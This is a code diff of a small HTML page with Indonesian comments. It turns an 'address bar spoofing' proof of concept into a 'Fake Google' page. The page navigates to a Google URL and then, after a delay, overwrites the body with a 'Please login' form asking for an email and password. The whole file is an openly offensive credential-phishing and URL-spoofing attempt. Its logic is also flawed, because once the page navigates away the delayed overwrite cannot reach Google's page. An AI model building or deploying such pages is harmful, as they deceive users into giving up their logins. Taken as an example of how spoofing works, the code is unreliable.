@@ -3,22 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Bar Spoofing</title>
+    <title>Fake Google</title>
 </head>
 <body>
     <button onclick="go()">Go</button>
 
     <script>
         function go(){
-            // Mengganti /csi menjadi /spoof di URL
-            var x = window.open('https://www.google.com/csi'); // URL yang sudah diganti
+            // Mengganti window.open dengan window.location untuk menghindari pop-up block
+            window.location = 'https://www.google.com/about'; // Ganti dengan URL yang kamu tuju
 
-            // Setelah 3 detik, mengganti konten di halaman baru dengan gambar dan form login
+            // Setelah 3 detik, mengganti konten halaman baru (berbeda dengan window.open)
             setTimeout(function() {
-                x.document.body.innerHTML = `
-                    <h1>Please login</h1>
-                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/wcAAwAB/74syFgAAAABJRU5ErkJggg==" 
-                    alt="Simple Image" style="width:100px;height:100px;">
+                document.body.innerHTML = `
+                    <h1 style="text-align: center; font-size: 3em; color: #4285F4;">Fake Google</h1>
+                    <h2 style="text-align: center;">Please login</h2>
                     <br><br>
                     Email: <input id="email"><br><br>
                     Pass: <input id="pass" type="password"><br><br>
